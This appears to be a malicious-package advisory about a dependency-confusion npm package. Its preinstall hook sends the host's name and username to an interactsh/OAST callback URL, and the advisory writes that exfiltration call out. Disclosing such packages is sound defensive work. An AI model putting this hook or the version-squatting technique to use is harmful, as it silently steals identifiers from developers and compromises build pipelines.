summary: Dependency-confusion package exfiltrates host identifiers via preinstall hook
details: package.json declares a `preinstall` script that runs `node -e` to invoke `require('https').get('https://d8knf6tt5p5gb5rnlp8g6wqfcq5q5nkhc.oast.site/?h=<hostname>&u=<username>')` plus a DNS lookup encoding the hostname into a subdomain of the same OAST/interactsh collaborator. On every `npm install`, the host's `os.hostname()` and `os.userInfo().username` are sent out-of-band to an attacker-controlled callback service without any user interaction. The package is published as version `9999.0.1` under the `@orion-design-system` scope with a self-described "dependency confusion PoC" purpose — the canonical Birsan-style squat shape designed to outrank an internal private-registry package by version-number resolution. Any developer or build system that resolves this scope from the public registry (intended target or not) has their machine identifiers exfiltrated.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
